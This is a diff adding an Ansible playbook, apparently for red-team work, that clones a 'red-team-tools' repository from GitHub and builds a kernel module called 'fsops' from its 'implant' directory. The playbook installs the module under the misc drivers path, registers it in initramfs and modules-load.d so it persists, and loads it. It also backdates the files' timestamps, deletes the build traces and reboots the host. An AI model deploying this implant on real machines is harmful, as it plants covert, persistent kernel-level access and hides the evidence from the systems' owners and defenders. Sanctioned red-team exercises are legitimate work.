@@ -1,0 +1,102 @@
+---
+- name: install maxkit
+  hosts: all
+  become: yes
+  vars:
+    ansible_build_user: debian
+
+  tasks:
+
+    - name: get kernel header
+      apt:
+        name:
+          - git
+          - build-essential
+          - "linux-headers-{{ ansible_kernel }}"
+        state: present
+      tags: install_dependencies
+
+    - name: build script
+      become_user: "{{ ansible_build_user }}"
+      ansible.builtin.copy:
+        dest: "/home/{{ ansible_build_user }}/build_module.sh"
+        content: |
+          #!/bin/bash
+          REPO_URL="https://github.com/mef5530/red-team-tools.git"
+          BUILD_DIR="/home/{{ ansible_build_user }}/red-team-tools"
+          KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
+          git clone "$REPO_URL" "$BUILD_DIR" || {exit 1; }
+          cd "$BUILD_DIR/implant" || {exit 1; }
+          make CFLAGS_MODULE=-Wno-error -C "$KERNEL_HEADERS" M=$(pwd) modules || {exit 1; }
+        mode: '0755'
+      tags: create_build_script
+
+    - name: run build
+      shell: "/home/{{ ansible_build_user }}/build_module.sh"
+      args:
+        executable: /bin/bash
+      become: yes
+      become_user: "{{ ansible_build_user }}"
+      tags: run_build_script
+
+    - name: copy to drivers
+      copy:
+        src: "/home/{{ ansible_build_user }}/red-team-tools/implant/fsops.ko"
+        dest: "/lib/modules/{{ ansible_kernel }}/kernel/drivers/misc/fsops.ko"
+        mode: 0644
+        remote_src: yes
+      tags: copy_module
+
+    - name: add to initramfs
+      lineinfile:
+        path: /etc/initramfs-tools/modules
+        line: "fsops"
+        state: present
+      tags: update_initramfs_config
+
+    - name: update initframs
+      command: update-initramfs -u
+      tags: regenerate_initramfs
+
+    - name: update deps
+      command: depmod -a
+      tags: update_depmod
+
+    - name: load mod
+      command: modprobe fsops
+      tags: load_module
+
+    - name: add to modload
+      copy:
+        dest: /etc/modules-load.d/fsops.conf
+        content: |
+          fsops
+        mode: 0644
+      tags: create_persistence
+
+    - name: change time
+      command: touch -t 07081218 /lib/modules/{{ ansible_kernel }}/kernel/drivers/misc/fsops.ko
+      tags: modify_timestamps
+
+    - name: change time
+      command: touch -t 07081218 /etc/modules-load.d/fsops.conf
+      tags: modify_timestamps
+
+    - name: delete build script
+      file:
+        path: "/home/{{ ansible_build_user }}/build_module.sh"
+        state: absent
+      become: yes
+      become_user: "{{ ansible_build_user }}"
+      tags: cleanup
+
+    - name: Remove redteamtools
+      file:
+        path: "/home/{{ ansible_build_user }}/red-team-tools"
+        state: absent
+      become: yes
+      tags: cleanup
+    
+    - name: reboot
+      reboot:
+        reboot_timeout: 500
